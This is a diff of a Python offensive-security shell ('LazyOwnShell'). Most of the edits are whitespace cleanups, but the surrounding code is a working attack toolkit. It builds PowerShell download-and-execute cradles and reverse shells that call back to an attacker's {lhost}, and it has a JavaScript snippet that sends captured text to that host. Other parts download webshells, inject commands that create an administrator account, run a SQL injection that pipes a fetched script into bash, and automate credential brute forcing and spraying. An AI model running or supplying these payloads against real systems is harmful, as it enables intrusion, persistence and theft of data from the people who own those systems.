             crackmapexec smb <target>
-        
+
         Example:
             crackmapexec smb 10.10.11.24
-        
+
         This command performs basic SMB enumeration and checks against the specified target IP address.
         """
         path = os.getcwd()
@@ -4172,7 +4173,7 @@ class LazyOwnShell(cmd2.Cmd):
 
                     print_msg(f"Try... crackmapexec smb {rhost} -u {username} -p {password} --rid-brute")
                     self.cmd(f"crackmapexec smb {rhost} -u {username} -p {password} --rid-brute")
-                    print_warn(f"Done... crackmapexec smb {rhost} -u {username} -p {password} --rid-brute")        
+                    print_warn(f"Done... crackmapexec smb {rhost} -u {username} -p {password} --rid-brute")
                     return
                 elif line.startswith("shares"):
                     path_cred = get_credentials(True)
@@ -4244,7 +4245,7 @@ class LazyOwnShell(cmd2.Cmd):
                 self.cmd(f"crackmapexec smb {rhost}")
                 print_msg(f"Done... crackmapexec smb {rhost}")
         return
-    
+
     @cmd2.with_category(scanning_category)
     def do_ldapdomaindump(self, line):
         """
@@ -4277,9 +4278,9 @@ class LazyOwnShell(cmd2.Cmd):
                 "You must have file sessions/credentials.txt with this format: user:password"
             )
             return
- 
+
         with open(path_cred, "r") as file:
-      
+
             for file_line in file:
                 params = file_line.split(":")
                 user = params[0]
@@ -4291,7 +4292,7 @@ class LazyOwnShell(cmd2.Cmd):
                     f"cd sessions && ldapdomaindump -u '{line}\\{user}' -p '{passwd}' {rhost}"
                 )
         return
-    
+
     @cmd2.with_category(scanning_category)
     def do_bloodhound(self, line):
         """Perform LDAP enumeration using bloodhound-python with credentials from a file.
@@ -4328,7 +4329,7 @@ class LazyOwnShell(cmd2.Cmd):
                     user = params[0]
                     passwd = params[1].replace("\n", "")
                     dc = input(f"    [!] enter DC subdomain example dc01: (Default: {subdomain})") or subdomain
-                    
+
                     if  dc:
                         sub = f" -gc '{dc}.{domain}' "
                     else:
@@ -4388,7 +4389,7 @@ class LazyOwnShell(cmd2.Cmd):
                                 "os": 'Linux',
                                 "ttl": ttl_value,
                                 "state": 'active'
-                            })         
+                            })
                         elif ttl_value <= 120 or ttl_value <= 128:
                             print_msg(
                                 f"{GREEN}Host activo {CYAN}probablemente es {RED}Windows{RESET}"
@@ -4398,7 +4399,7 @@ class LazyOwnShell(cmd2.Cmd):
                                 "os": 'Windows',
                                 "ttl": ttl_value,
                                 "state": 'active'
-                            })                             
+                            })
                         else:
                             print_error(
                                 "No se puede determinar con certeza el sistema operativo"
@@ -4423,9 +4424,9 @@ class LazyOwnShell(cmd2.Cmd):
                 print_error("No se pudo realizar el ping al host")
             print_msg(f"Done... ping -c 1 {rhost} ")
             with open('sessions/os.json', 'w') as json_file:
-                json.dump(os_json, json_file, indent=4)            
+                json.dump(os_json, json_file, indent=4)
         return
-    
+
     @cmd2.with_category(recon_category)
     def do_gospider(self, line):
         """Try gospider for web spidering.
@@ -4486,7 +4487,7 @@ class LazyOwnShell(cmd2.Cmd):
 
             print_msg(cmd)
             return
-        
+
         if line == "ssl":
             url = self.params["url"].replace("http","https")
             if not url:
@@ -4500,7 +4501,7 @@ class LazyOwnShell(cmd2.Cmd):
 
             print_msg(cmd)
             return
-        
+
         if not check_rhost(rhost):
             return
         if is_binary_present("gospider"):
@@ -4707,7 +4708,7 @@ class LazyOwnShell(cmd2.Cmd):
     @cmd2.with_category(exploitation_category)
     def do_sqlmap(self, line):
         """
-        Uses sqlmap to perform SQL injection testing on a given URL or request file (you can get one with burpsuit or proxy command and foxyproxy plugin for browser). 
+        Uses sqlmap to perform SQL injection testing on a given URL or request file (you can get one with burpsuit or proxy command and foxyproxy plugin for browser).
 
         This function allows the execution of sqlmap commands with various options, including testing URL endpoints, reading from request files, and using sqlmap's wizard mode for easy configuration.
 
@@ -4865,7 +4866,7 @@ class LazyOwnShell(cmd2.Cmd):
             print_msg(f"Try... sqlmap -u {url} --os-shell --forms --crawl=2")
             self.cmd(f"sqlmap -u {url} --os-shell --forms --crawl=2")
         return
-    
+
     @cmd2.with_category(recon_category)
     def do_proxy(self, line):
         """
@@ -4903,7 +4904,7 @@ class LazyOwnShell(cmd2.Cmd):
             f"{YELLOW} Shutdown proxy server at sessions in port {RED} 8888 {RESET}"
         )
         return
-    
+
     @cmd2.with_category(persistence_category)
     def do_createwebshell(self, line):
         """
@@ -4944,9 +4945,9 @@ class LazyOwnShell(cmd2.Cmd):
         )
         wget2 = f"wget -P {sessions} https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.asp"
         print_msg(wget2)
-        self.cmd(wget2)        
+        self.cmd(wget2)
         return
-    
+
     @cmd2.with_category(persistence_category)
     def do_createrevshell(self, line):
         """
@@ -5026,8 +5027,8 @@ class LazyOwnShell(cmd2.Cmd):
                 content = f.read()
                 if not content.strip():
                     print_error("Error: payload.ps1 file is empty.")
-                    return            
-        
+                    return
+
         payload = "IEX(New-Object Net.WebClient).DownloadString('http://{lhost}/payload.ps1')".replace("{lhost}",lhost)
         print_msg(payload)
         payload2 = "IEX(New-Object Net.WebClient).DownloadString('http://{lhost}/Invoke-PowerShellTcp.ps1')".replace("{lhost}",lhost)
@@ -5041,7 +5042,7 @@ class LazyOwnShell(cmd2.Cmd):
         print_msg(f"Generated Windows payload: powershell /enc  {payload}")
         print_msg(f"Generated Windows payload: powershell /enc  {payload2}")
         return
-    
+
     @cmd2.with_category(persistence_category)
     def do_createwinrevshell(self, line):
         """
@@ -5117,9 +5118,9 @@ class LazyOwnShell(cmd2.Cmd):
         copy2clip(
             f"curl http://{lhost}/revshell.ps1 -o revshell.ps1 ; .\\\\revshell.ps1'"
         )
-        
+
         return
-    
+
     @cmd2.with_category(credential_access_category)
     def do_createhash(self, line):
         """
@@ -5173,7 +5174,7 @@ class LazyOwnShell(cmd2.Cmd):
         self.onecmd("create_session_json")
 
         return
-    
+
     @cmd2.with_category(credential_access_category)
     def do_createcredentials(self, line):
         """
@@ -5211,7 +5212,7 @@ class LazyOwnShell(cmd2.Cmd):
 
         credentials_file_path = 'sessions/credentials.txt'
         if ":" in line:
-            
+
             if os.path.exists(credentials_file_path):
                 with open(credentials_file_path, 'r') as file:
                     existing_credentials = file.readline().strip()
@@ -5281,7 +5282,7 @@ class LazyOwnShell(cmd2.Cmd):
                 f"El formato de entrada es incorrecto. Asegúrate de que el formato sea: cookie=user_data=valor_base64  {line}{RESET}"
             )
             return
-        
+
     @cmd2.with_category(miscellaneous_category)
     def do_download_resources(self, line):
         """
@@ -5314,7 +5315,7 @@ class LazyOwnShell(cmd2.Cmd):
         os.system("cd sessions && ./download_resources.sh ")
         print_msg(f"Resources downloaded now you can run command {MAGENTA}www {RESET}")
         return
-    
+
     @cmd2.with_category(exploitation_category)
     def do_download_exploit(self, line):
         """
@@ -5458,7 +5459,7 @@ class LazyOwnShell(cmd2.Cmd):
             return
         if line:
             command = f"sudo john {hashs} {line}"
-            print_msg(command)  
+            print_msg(command)
             self.cmd(command)
         else:
             print_msg(f"Try john {hashs} --wordlist={wordlist}")
@@ -5524,7 +5525,7 @@ class LazyOwnShell(cmd2.Cmd):
             return [f for f in glob.glob("sessions/hash.txt") if f.startswith(text)]
 
         return []
-    
+
     @cmd2.with_category(privilege_escalation_category)
     def do_responder(self, line):
         """
@@ -5566,7 +5567,7 @@ class LazyOwnShell(cmd2.Cmd):
         print_msg(f"Try sudo responder -I {device} -w On ")
         self.cmd(f"sudo responder -I {device} -w On ")
         return
-    
+
     @cmd2.with_category(miscellaneous_category)
     def do_ip(self, line):
         """
@@ -5618,8 +5619,8 @@ class LazyOwnShell(cmd2.Cmd):
             lhost = clipboard_ip
             self.onecmd(f"assign lhost {clipboard_ip}")
             self.custom_prompt = getprompt()
-    
-            print_msg(f"Updated lhost to {clipboard_ip}")        
+
+            print_msg(f"Updated lhost to {clipboard_ip}")
         return
 
 
@@ -5664,22 +5665,22 @@ class LazyOwnShell(cmd2.Cmd):
                 "ip a show tun0 | grep 'inet ' | awk '{print $2}' | cut -d'/' -f1",
                 shell=True
             ).decode().strip()
-            
-        
+
+
         except subprocess.CalledProcessError:
             print_error("Error retrieving IP address from tun0.")
-        
+
         # Optionally update lhost
         lhost = self.params['lhost']
         if ip_address and ip_address != lhost:
             lhost = ip_address
             # Example of how you might set the new lhost
             self.params['lhost'] = lhost
-           
+
             print_msg(f"Updated lhost to {lhost}")
 
         return
-    
+
     @cmd2.with_category(miscellaneous_category)
     def do_rhost(self, line):
         """
@@ -5711,7 +5712,7 @@ class LazyOwnShell(cmd2.Cmd):
         Example:
             rhost
             # This will copy the current `rhost` to the clipboard and update the prompt.
-            
+
             rhost clean
             # This will reset the command prompt to its default format.
 
@@ -5763,7 +5764,7 @@ class LazyOwnShell(cmd2.Cmd):
         Example:
             rhost
             # This will update the command prompt to include the `rhost` and current working directory.
-            
+
             rhost clean
             # This will reset the command prompt to its default format.
 
@@ -5772,12 +5773,12 @@ class LazyOwnShell(cmd2.Cmd):
         """
         url = self.params['url']
         rhost = self.params["rhost"]
-        
+
         if not check_rhost(rhost):
             return
-                
+
         cwd = os.getcwd()
-        
+
         if line == 'clean':
             self.custom_prompt = getprompt()
             self.prompt = f"{self.custom_prompt}"
@@ -5785,7 +5786,7 @@ class LazyOwnShell(cmd2.Cmd):
             self.custom_prompt = getprompt().replace(']', f" ~{GREEN}{cwd}{YELLOW}]{BRIGHT_YELLOW}[{MAGENTA}{rhost}{BRIGHT_YELLOW}][{BRIGHT_BLUE}{url}{BRIGHT_YELLOW}]")
             self.prompt = f"{self.custom_prompt}"
         return
-    
+
     @cmd2.with_category(miscellaneous_category)
     def do_banner(self, line):
         """Show the banner"""
@@ -5794,7 +5795,7 @@ class LazyOwnShell(cmd2.Cmd):
             print_msg(
                 f"    {BG_BLACK}{RED}{BANNER}{MAGENTA}Autor: {CYAN}grisUN0{RESET}"
             )
-        
+
             print_msg(LazyOwnShell().intro)
         return
 
@@ -5938,7 +5939,7 @@ class LazyOwnShell(cmd2.Cmd):
             fetch('http://{lhost}/log?' + btoa(text), {
                 mode: 'no-cors'
             });
-        });        
+        });
         """.replace("        ",'').replace("{lhost}",lhost)
         with open(filename, "w") as f:
             f.write(js)
@@ -5977,7 +5978,7 @@ class LazyOwnShell(cmd2.Cmd):
             print_msg(f"Payload 2 copied to Clipboard")
         elif choice == "3":
             copy2clip(secondary_payload)
-            print_msg(f"Payload 3 copied to Clipboard") 
+            print_msg(f"Payload 3 copied to Clipboard")
         else:
             print_error("Invalid choice. Please select 1, 2 or 3.")
 
@@ -6111,7 +6112,7 @@ class LazyOwnShell(cmd2.Cmd):
         self.cmd(f"echo '{cmd}' |  xclip -sel clip")
         print_msg(f"{cmd} {YELLOW} Copied to clipboard :D {RESET}")
         return
-    
+
     @cmd2.with_category(persistence_category)
     def do_pwncatcs(self, line):
         """
@@ -6390,7 +6391,7 @@ class LazyOwnShell(cmd2.Cmd):
             ("WIN WEB Inyection", "abc.txt | powershell -enc "),
             ("WIN WEB Inyection" ,'abc.txt | net user lazyown abc123! /add ; net localgroup administrators lazyown /add'),
             ("WIN ReverShell winbase64encode", f'echo -n "IEX(New-Object System.Net.WebClient).DownloadString(\'http://{lhost}/Invoke-PowerShellTcp.ps1\')" | iconv -t UTF-16LE | base64 -w0'),
-            ("WIN ReverShell echo", f"echo 'Invoke-PowerShellTcp -Reverse -IPAddress {lhost} -Port {lport}' >> sessions/Invoke-PowerShellTcp.ps1"),            
+            ("WIN ReverShell echo", f"echo 'Invoke-PowerShellTcp -Reverse -IPAddress {lhost} -Port {lport}' >> sessions/Invoke-PowerShellTcp.ps1"),
             ("WIN enum locker", "get-applockerPolicy -effective -xml"),
             ("WIN enum Policy", "get-applockerpolicy -effective | select -expandproperty rulecollections"),
             ("WIN enum WMI access",'netsh advfirewall firewall set rule group="windows management instrumentation (wmi)" new enable=yes'),
@@ -6405,24 +6406,24 @@ class LazyOwnShell(cmd2.Cmd):
             ("WEB Cady yummy", f"{url}/admindashboard?s=aa&o=ASC%3b++select+\"curl+{lhost}/revshell.sh+|bash%3b\"+INTO+OUTFILE++'/data/scripts/fixer-v___'+%3b "),
             ("WEB Prestashop CVE-2020-16194", f"curl -s -k -X $'POST' --data-binary $'opart_devis_customer_id=-1&delivery_address=1&invoice_address=0&opart_devis_carrier_input=1&selected_carrier=0' $'http://{rhost}/index.php?fc=module&module=opartdevis&controller=createquotation&change_carrier_cart' ")
         ]
-        
+
         filtered_commands = [(alias, cmd) for alias, cmd in commands_list if line.lower() in alias.lower() or line.lower() in cmd.lower()] if line else commands_list
 
         for idx, (alias, cmd) in enumerate(filtered_commands):
-            if cmd: 
+            if cmd:
                 print_msg(f"{idx + 1}{RESET}. Alias:{YELLOW} {alias}{RESET}, Command:{GREEN} {cmd}")
 
         try:
             choice = int(input("    [!] Enter the number of the command you want to execute: ")) - 1
             if 0 <= choice < len(filtered_commands):
                 selected_alias, selected_cmd = filtered_commands[choice]
-                if selected_cmd: 
+                if selected_cmd:
                     confirm = input(f"   [?] Do you want to execute the command: {selected_cmd}? l to local, r to remote, or n to no exec (l/r/n): ").strip().lower() or 'n'
-                    
+
                     if confirm == 'l':
                         print_warn(f"Executing command: {selected_cmd}")
                         subprocess.run(selected_cmd + " 2>/dev/null", shell=True)
-                        
+
                         command_clipboard = subprocess.Popen(
                             ['xclip', '-selection', 'clipboard'],
                             stdin=subprocess.PIPE
@@ -6438,7 +6439,7 @@ class LazyOwnShell(cmd2.Cmd):
                             stdin=subprocess.PIPE
                         )
                         command_clipboard.communicate(input=selected_cmd.encode())
-                        print_msg(f"Command copied to clipboard: {selected_cmd}")                        
+                        print_msg(f"Command copied to clipboard: {selected_cmd}")
                     else:
                         print_warn("Command execution cancelled.")
                         command_clipboard = subprocess.Popen(
@@ -6456,14 +6457,14 @@ class LazyOwnShell(cmd2.Cmd):
         except Exception as e:
             print_error(f"An error occurred: {e}")
         return
-    
+
     @cmd2.with_category(miscellaneous_category)
     def do_sh(self, line):
         """
         Executes a shell command directly from the LazyOwn interface.
 
-        This function allows the user to execute arbitrary shell commands without exiting the LazyOwn shell. 
-        It checks if a command is provided, prints a message indicating the command being executed, and then 
+        This function allows the user to execute arbitrary shell commands without exiting the LazyOwn shell.
+        It checks if a command is provided, prints a message indicating the command being executed, and then
         runs the command using `os.system`.
 
         Usage:
@@ -6488,14 +6489,14 @@ class LazyOwnShell(cmd2.Cmd):
 
         self.cmd(f"{line}")
         return
-    
+
     @cmd2.with_category(miscellaneous_category)
     def do_sys(self, line):
         """
         Executes a shell command directly from the LazyOwn interface.
 
-        This function allows the user to execute arbitrary shell commands without exiting the LazyOwn shell. 
-        It checks if a command is provided, prints a message indicating the command being executed, and then 
+        This function allows the user to execute arbitrary shell commands without exiting the LazyOwn shell.
+        It checks if a command is provided, prints a message indicating the command being executed, and then
         runs the command using `os.system`.
 
         Usage:
@@ -6527,7 +6528,7 @@ class LazyOwnShell(cmd2.Cmd):
         Displays the current working directory and lists files, and copies the current directory path to the clipboard.
 
         This function performs the following tasks:
-        1. Displays the current working directory with `pwd` and lists files in the directory using `ls`. 
+        1. Displays the current working directory with `pwd` and lists files in the directory using `ls`.
         2. Copies the current directory path to the clipboard using `xclip`.
 
         Usage:
@@ -6869,7 +6870,7 @@ class LazyOwnShell(cmd2.Cmd):
         """
 
         rhost = self.params["rhost"]
-        
+
         if not check_rhost(rhost):
             return
 
@@ -6884,16 +6885,16 @@ class LazyOwnShell(cmd2.Cmd):
                 "sessions/creadentials.txt must exist ex: createcredentials user:password "
             )
             return
-        
+
         credentials = get_credentials()
         if not credentials:
-            return  
+            return
 
         for user, passwd in credentials:
             command = f"sshpass -p '{passwd}'  ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null  -p {rport} {user}@{rhost}"
             print_msg(command)
             self.cmd(command)
-        
+
         return
 
     @cmd2.with_category(persistence_category)
@@ -6944,7 +6945,7 @@ class LazyOwnShell(cmd2.Cmd):
             else:
                 credentials = get_credentials()
             if not credentials:
-                return  
+                return
 
             for user, passwd in credentials:
                 command = f"sshpass -p '{passwd}' ftp {user}@{rhost}"
@@ -6983,7 +6984,7 @@ class LazyOwnShell(cmd2.Cmd):
         echo "UDP Ports:"; \
         awk 'NR>1 {split($2, a, ":"); ip=sprintf("%d.%d.%d.%d", strtonum("0x" substr(a[1], 7, 2)), strtonum("0x" substr(a[1], 5, 2)), strtonum("0x" substr(a[1], 3, 2)), strtonum("0x" substr(a[1], 1, 2))); printf "%s:%d\\n", ip, strtonum("0x" a[2])}' /proc/net/udp
         """
-        
+
         print_msg(f"{GREEN} {tcp_cmd} {RESET}")
         command = "0..65535 | % {echo ((new-object Net.Sockets.TcpClient).Connect(<tgt_ip>,$_)) \"Port $_ open\"} 2>$null".replace("<tgt_ip>",rhost)
         print_msg(f"Windows usage: {command}")
@@ -7114,21 +7115,21 @@ class LazyOwnShell(cmd2.Cmd):
         if format_key == 'y':
             with open(file, 'r') as key_file:
                 raw_key = key_file.read()
-            
+
             choice = input(f"    [?] do you wat format your rsa key ? 1) for openssh format or 2) for rsa_key format [1/2] (default: 1): ") or '1'
             if choice == '1':
                 formatted_key = format_openssh_key(raw_key)
-            
+
                 with open(file, 'w') as key_file:
                     key_file.write(formatted_key)
-                
+
                 print_msg("Key formatted and saved.")
-            elif choice == '2':    
+            elif choice == '2':
                 formatted_key = format_rsa_key(raw_key)
-            
+
                 with open(file, 'w') as key_file:
                     key_file.write(formatted_key)
-                
+
                 print_msg("Key formatted and saved.")
             else:
                 print_warn("Wrong choice!")
@@ -7254,7 +7255,7 @@ class LazyOwnShell(cmd2.Cmd):
 
         Example usage:
         >>> do_swaks("line")
-        
+
         swaks --from attacker@hell.com --to victim@heaven.com,victim2@heaven.com,victim3@heaven.com   --body "testing" --server 127.0.0.1
         """
 
@@ -7263,10 +7264,10 @@ class LazyOwnShell(cmd2.Cmd):
             return
         from_attacker = input(
             f"    {CYAN}[?] {MAGENTA}FROM:  {RESET}"
-        ).strip()    
+        ).strip()
         to_victim = input(
             f"    {CYAN}[?] {MAGENTA}TO:  {RESET}"
-        ).strip()    
+        ).strip()
         body = input(
             f"    {CYAN}[?] {MAGENTA}BODY:  {RESET}"
         ).strip()
@@ -7314,14 +7315,14 @@ class LazyOwnShell(cmd2.Cmd):
                 hashis = f"-hashes {hash_value}"
             else:
                 hashis = f"-hashes :{hash_value}"
-                
+
             user = input("    [!] Enter Username (default: Administrator): ") or 'Administrator'
             command = f"impacket-samrdump -port 139 -target-ip {rhost} {hashis} -dc-ip {rhost} {domain}"
             print_msg(command)
             self.cmd(command)
             command = f"impacket-samrdump -port 445 -target-ip {rhost} {hashis} -dc-ip {rhost} {domain}"
             print_msg(command)
-            self.cmd(command)            
+            self.cmd(command)
             return
         else:
             print_msg(f"Try... impacket-samrdump -port 139  {rhost}")
@@ -7330,7 +7331,7 @@ class LazyOwnShell(cmd2.Cmd):
             self.cmd(f"impacket-samrdump -port 445  {rhost}")
 
         return
-    
+
     @cmd2.with_category(miscellaneous_category)
     def do_urlencode(self, line):
         """
@@ -7417,7 +7418,7 @@ class LazyOwnShell(cmd2.Cmd):
         self.cmd(f"sudo modules/lazylynis.sh {rhost}")
 
         return
-    
+
     @cmd2.with_category(scanning_category)
     def do_snmpcheck(self, line):
         """
@@ -7444,7 +7445,7 @@ class LazyOwnShell(cmd2.Cmd):
         print_msg(f"Try... snmp-check {rhost}")
         self.cmd(f"snmp-check {rhost}")
         return
-    
+
     @cmd2.with_category(scanning_category)
     def do_snmpwalk(self, line):
         """
@@ -7471,7 +7472,7 @@ class LazyOwnShell(cmd2.Cmd):
         print_msg(f"Try... snmpwalk -v 2c -c public {rhost}")
         self.cmd(f"snmpwalk -v 2c -c public {rhost}")
         return
-    
+
     @cmd2.with_category(miscellaneous_category)
     def do_encode(self, line):
         """
@@ -7511,7 +7512,7 @@ class LazyOwnShell(cmd2.Cmd):
         decode(encoded_string, shift_value, substitution_key)
         copy2clip(encoded_string)
         return
-    
+
     @cmd2.with_category(miscellaneous_category)
     def do_decode(self, line):
         """
@@ -7549,7 +7550,7 @@ class LazyOwnShell(cmd2.Cmd):
         print_msg(f"Decoded string: {decoded_string}")
         copy2clip(decoded_string)
         return
-    
+
     @cmd2.with_category(credential_access_category)
     def do_cred(self, line):
         """
@@ -7587,12 +7588,12 @@ class LazyOwnShell(cmd2.Cmd):
         Ensure `xclip` is installed on your system for copying to the clipboard. The function assumes that `xclip` is available
         and correctly configured.
         """
-        path = os.getcwd()    
+        path = os.getcwd()
         file = f"{path}/sessions/credentials.txt"
         if not os.path.exists(file):
             print_error("You need use createcredentials user:pass before.")
             return
-        
+
         with open(file, "rb") as f:
             data = f.read()
         creds = data.split(b":")
@@ -7608,24 +7609,24 @@ class LazyOwnShell(cmd2.Cmd):
         """
         Discover active hosts in a subnet by performing a ping sweep.
 
-        This method constructs and executes a bash script that performs a 
-        ping sweep on the specified subnet to identify active hosts. The 
-        subnet is determined from the 'rhost' parameter. For each host in 
+        This method constructs and executes a bash script that performs a
+        ping sweep on the specified subnet to identify active hosts. The
+        subnet is determined from the 'rhost' parameter. For each host in
         the subnet, a ping request is sent, and active hosts are reported.
 
         Parameters:
         - line (str): The input line argument is not used in this function.
 
         Behavior:
-        - Extracts the first three octets of the 'rhost' parameter to form 
+        - Extracts the first three octets of the 'rhost' parameter to form
         the base IP pattern.
-        - Constructs a bash script to ping each IP address in the subnet 
+        - Constructs a bash script to ping each IP address in the subnet
         (from .1 to .254) and reports active hosts.
         - The generated bash script is displayed to the user.
-        - Prompts the user to confirm whether they want to execute the 
+        - Prompts the user to confirm whether they want to execute the
         generated command.
         - If the user confirms, executes the command using `self.cmd()`.
-        - If the user declines, copies the command to the clipboard using 
+        - If the user declines, copies the command to the clipboard using
         `copy2clip()`.
 
         Side Effects:
@@ -7633,11 +7634,11 @@ class LazyOwnShell(cmd2.Cmd):
         - May modify the clipboard content if the user chooses not to execute.
 
         Notes:
-        - Ensure that the 'rhost' parameter is a valid IP address and that 
+        - Ensure that the 'rhost' parameter is a valid IP address and that
         the `check_rhost()` function is implemented to validate the IP.
-        - `print_msg()` is used to display the constructed command to the 
+        - `print_msg()` is used to display the constructed command to the
         user.
-        - `copy2clip()` is used to copy the command to the clipboard if 
+        - `copy2clip()` is used to copy the command to the clipboard if
         not executed.
 
         Example:
@@ -7647,7 +7648,7 @@ class LazyOwnShell(cmd2.Cmd):
         if not check_rhost(rhost):
             return
         oct_rhost = rhost.split('.')
-        pattern = oct_rhost[0] + "." + oct_rhost[1] + "." + oct_rhost[2] 
+        pattern = oct_rhost[0] + "." + oct_rhost[1] + "." + oct_rhost[2]
         command = """        #!/bin/bash
         for i in $(seq 1 254); do
                 timeout 1 bash -c "ping -c 1 {pattern}.$i" &>/dev/null && echo "[+] Host {pattern}.$i - active" &
@@ -7666,8 +7667,8 @@ class LazyOwnShell(cmd2.Cmd):
         """
         Scan all ports on a specified host to identify open ports.
 
-        This method constructs and executes a bash script that performs a 
-        port scan on the specified host to determine which ports are open. 
+        This method constructs and executes a bash script that performs a
+        port scan on the specified host to determine which ports are open.
         It scans all ports from 0 to 65535 and reports any that are open.
 
         Parameters:
@@ -7675,13 +7676,13 @@ class LazyOwnShell(cmd2.Cmd):
 
         Behavior:
         - Extracts the 'rhost' parameter to determine the target IP address.
-        - Constructs a bash script to scan all ports on the target IP address 
+        - Constructs a bash script to scan all ports on the target IP address
         and report open ports.
         - The generated bash script is displayed to the user.
-        - Prompts the user to confirm whether they want to execute the 
+        - Prompts the user to confirm whether they want to execute the
         generated command.
         - If the user confirms, executes the command using `self.cmd()`.
-        - If the user declines, copies the command to the clipboard using 
+        - If the user declines, copies the command to the clipboard using
         `copy2clip()`.
 
         Side Effects:
@@ -7689,11 +7690,11 @@ class LazyOwnShell(cmd2.Cmd):
         - May modify the clipboard content if the user chooses not to execute.
 
         Notes:
-        - Ensure that the 'rhost' parameter is a valid IP address and that 
+        - Ensure that the 'rhost' parameter is a valid IP address and that
         the `check_rhost()` function is implemented to validate the IP.
-        - `print_msg()` is used to display the constructed command to the 
+        - `print_msg()` is used to display the constructed command to the
         user.
-        - `copy2clip()` is used to copy the command to the clipboard if 
+        - `copy2clip()` is used to copy the command to the clipboard if
         not executed.
 
         Example:
@@ -7704,7 +7705,7 @@ class LazyOwnShell(cmd2.Cmd):
             return
 
         command = """        #!/bin/bash
-        ip="{rhost}" 
+        ip="{rhost}"
         echo "Escaneo de puertos abiertos en curso..."
         echo " "
 
@@ -7726,9 +7727,9 @@ class LazyOwnShell(cmd2.Cmd):
         """
         Scan all ports on a specified host to identify open ports and associated services.
 
-        This method constructs and executes a bash script that performs a 
-        port scan on the specified host to determine which ports are open 
-        and identifies any services running on those open ports. It scans 
+        This method constructs and executes a bash script that performs a
+        port scan on the specified host to determine which ports are open
+        and identifies any services running on those open ports. It scans
         all ports from 0 to 65535.
 
         Parameters:
@@ -7736,13 +7737,13 @@ class LazyOwnShell(cmd2.Cmd):
 
         Behavior:
         - Extracts the 'rhost' parameter to determine the target IP address.
-        - Constructs a bash script to scan all ports on the target IP address 
+        - Constructs a bash script to scan all ports on the target IP address
         and report open ports along with any associated services.
         - The generated bash script is displayed to the user.
-        - Prompts the user to confirm whether they want to execute the 
+        - Prompts the user to confirm whether they want to execute the
         generated command.
         - If the user confirms, executes the command using `self.cmd()`.
-        - If the user declines, copies the command to the clipboard using 
+        - If the user declines, copies the command to the clipboard using
         `copy2clip()`.
 
         Side Effects:
@@ -7751,11 +7752,11 @@ class LazyOwnShell(cmd2.Cmd):
         - May modify the clipboard content if the user chooses not to execute.
 
         Notes:
-        - Ensure that the 'rhost' parameter is a valid IP address and that 
+        - Ensure that the 'rhost' parameter is a valid IP address and that
         the `check_rhost()` function is implemented to validate the IP.
-        - `print_msg()` is used to display the constructed command to the 
+        - `print_msg()` is used to display the constructed command to the
         user.
-        - `copy2clip()` is used to copy the command to the clipboard if 
+        - `copy2clip()` is used to copy the command to the clipboard if
         not executed.
 
         Example:
@@ -7766,7 +7767,7 @@ class LazyOwnShell(cmd2.Cmd):
             return
 
         command = """        #!/bin/bash
-        ip="{rhost}" 
+        ip="{rhost}"
         echo "Escaneo de puertos y servicios abiertos en curso..."
         echo " "
 
@@ -7791,7 +7792,7 @@ class LazyOwnShell(cmd2.Cmd):
         """
         Apply a ROT (rotation) substitution cipher to the given string.
 
-        This function rotates each character in the input string by the specified number of positions in the alphabet. It supports rotation values between 1 and 27. 
+        This function rotates each character in the input string by the specified number of positions in the alphabet. It supports rotation values between 1 and 27.
 
         Usage:
             rot <number> '<string>'
@@ -7805,7 +7806,7 @@ class LazyOwnShell(cmd2.Cmd):
 
         Note: The function assumes that the rotation number is an integer between 1 and 27. If the number is out of range or not a valid integer, it will print an error message.
         """
-        
+
         parts = line.split("'", 1)
         if len(parts) != 2:
             print_error("Usage: rot <number> '<string>'")
@@ -7822,7 +7823,7 @@ class LazyOwnShell(cmd2.Cmd):
             print_error(f"Invalid number: {e}")
             return
         rotated_text = "".join(rotate_char(c, number) for c in text)
-        
+
         copy2clip(rotated_text)
         return
 
@@ -7831,7 +7832,7 @@ class LazyOwnShell(cmd2.Cmd):
         """
         Apply a ROT (rotation) substitution cipher to the given extension.
 
-        This function rotates each character in the input extension by the specified number of positions in the alphabet. It supports rotation values between 1 and 27. 
+        This function rotates each character in the input extension by the specified number of positions in the alphabet. It supports rotation values between 1 and 27.
 
         Usage:
             rot <number> '<extension>'
@@ -7867,7 +7868,7 @@ class LazyOwnShell(cmd2.Cmd):
         with open(text, 'r') as file:
             content = file.read().strip()
         file_name = text.replace(f".{ext}", f"_rotated_{number}.{ext}")
-        
+
         rotated_text = "".join(rotate_char(c, number) for c in content)
         with open(file_name, 'w') as f:
             f.write(rotated_text)
@@ -7900,7 +7901,7 @@ class LazyOwnShell(cmd2.Cmd):
 
         rhost = self.params.get("rhost")
         wordlist = self.params.get("wordlist")
-        
+
         if not wordlist:
             print_error(
                 "You need to load the wordlist using p or payload or assign wordlist /path/to/wordlist"
@@ -7931,7 +7932,7 @@ class LazyOwnShell(cmd2.Cmd):
             smalldic = f"{path}/modules/credentials.json"
             with open(smalldic, 'r') as f:
                 data = json.load(f)
-            
+
             # Create temporary files for users and passwords
             with open('sessions/small_users.txt', 'w') as f:
                 for username in data["usernames"]:
@@ -7952,7 +7953,7 @@ class LazyOwnShell(cmd2.Cmd):
         print_msg(f"Try... {command}")
         self.cmd(command)
         return
-    
+
     @cmd2.with_category(credential_access_category)
     def do_medusa(self, line):
         """Uses medusa to perform a brute force attack on a specified ssh service with a user and password list.
@@ -7962,7 +7963,7 @@ class LazyOwnShell(cmd2.Cmd):
         3. Asks the user if they want to use a small dictionary from a JSON file.
         4. Constructs and prints the medusa command with the provided parameters.
         5. Executes the medusa command using `os.system`.
-       
+
         :param line: The port if is't default port.
         :type line: str
         :returns: None
@@ -7989,7 +7990,7 @@ class LazyOwnShell(cmd2.Cmd):
             return
         if line:
             option = f"-n {line}"
-        
+
         use_small_dict = input("Do you want to use the small dictionary? (yes/no): ").strip().lower()
 
         if use_small_dict == "yes":
@@ -7997,7 +7998,7 @@ class LazyOwnShell(cmd2.Cmd):
             smalldic = f"{path}/modules/credentials.json"
             with open(smalldic, 'r') as f:
                 data = json.load(f)
-            
+
             # Create temporary files for users and passwords
             with open('sessions/small_users.txt', 'w') as f:
                 for username in data["usernames"]:
@@ -8047,14 +8048,14 @@ class LazyOwnShell(cmd2.Cmd):
         if len(parts) != 2:
             print_error("Usage: nmapscript <script> <port>")
             return
-        script = parts[0]    
+        script = parts[0]
         port = parts[1]
         print_msg(
             f"Try... nmap -sCV --script {script} -p{port} {rhost} -oN sessions/{script}_{rhost}"
         )
         self.cmd(f"nmap -sCV --script {script} -p{port} {rhost} -oN sessions/{script}_{rhost}")
